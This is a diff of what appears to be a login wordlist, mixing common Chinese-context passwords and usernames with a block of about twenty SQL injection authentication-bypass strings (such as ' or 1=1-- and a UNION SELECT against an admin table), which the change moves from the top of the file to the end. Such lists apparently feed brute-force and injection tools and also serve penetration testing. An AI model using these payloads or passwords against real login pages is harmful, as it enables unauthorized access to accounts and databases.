@@ -6,27 +6,7 @@ summer
 administrator
 guanliyuan
 admin
-NUll       
-'or 1=1/*
-a' or 1=1-- s
-1'or'1'='1
-"or "a"="a
-')or('a'='a
-or 1=1-- s
-'or 1=1-- s
-a'or' 1=1--  
-"or 1=1--+
-'or'a'='a
-"or"="a'='a
-admin' or 'a'='a
-'or''='
-'or'='or'
-1 or '1'='1'=1
-1 or '1'='1' or 1=1
-'OR 1=1
-"or 1=1
-'xor
-' UNION Select 1,1,1 FROM admin Where ''='
+NUll
 23456
 liudehua
 liudehua1314
@@ -5673,3 +5653,23 @@ qq12345
 11011
 dandan
 852963
+'or 1=1/*
+a' or 1=1-- s
+1'or'1'='1
+"or "a"="a
+')or('a'='a
+or 1=1-- s
+'or 1=1-- s
+a'or' 1=1--  
+"or 1=1--+
+'or'a'='a
+"or"="a'='a
+admin' or 'a'='a
+'or''='
+'or'='or'
+1 or '1'='1'=1
+1 or '1'='1' or 1=1
+'OR 1=1
+"or 1=1
+'xor
+' UNION Select 1,1,1 FROM admin Where ''='
